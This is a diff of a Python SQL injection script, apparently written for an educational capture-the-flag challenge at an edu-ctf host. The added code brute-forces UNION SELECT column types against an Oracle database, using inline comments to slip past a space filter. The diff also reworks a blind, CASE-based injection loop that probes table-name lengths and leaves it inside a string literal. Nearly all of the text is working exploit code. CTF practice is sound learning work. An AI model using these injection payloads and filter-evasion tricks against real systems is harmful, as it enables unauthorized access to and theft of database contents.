@@ -3,14 +3,24 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-url = 'https://edu-ctf.csie.org:10159/video.php?vid='
+url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1'
 
+for first in ['null', '1', '\'a\'']:
+    for second in ['null', '1', '\'a\'']:
+        for third in ['null', '1', '\'a\'']:
+            payload = '/**/union/**/select/**/' + first + ',' + second + ',' + third + '/**/from/**/dual'
+
+            url2 = url + payload
+            result = requests.get(url2, verify=False)
+
+            if 'Error' not in result.text and 'Bad cat!' not in result.text:
+                print(result.text)
+                print('url now %s'%(url2))
+
+'''
 for i in range(0, 100):
-    url2 = url + '(case/**/when/**/(length(select/**/table_name/**/from/**/all_tables/**/FETCH/**/FIRST/**/1/**/ROWS/**/ONLY)==' + str(i) + ')/**/then/**/1/**/else/**/2/**/end)'
-    print(url2)
-    input()
+    url2 = url + '(case/**/when/**/(length(SELECT/**/TABLE_NAME/**/FROM/**/SELECT/**/TABLE_NAME/**/,/**/rownum/**/as/**/r/**/FROM/**/all_tables/**/WHERE/**/r=1)='+ str(i) + ')/**/then/**/1/**/else/**/2/**/end)'
     result = requests.get(url2, verify=False)
-    print(result.text)
     if 'Error' not in result.text:
         print(result.text)
 
@@ -30,4 +40,4 @@ for i in range(0, 255):
 #print('--------------')
 #print(result.headers)
 
-
+'''
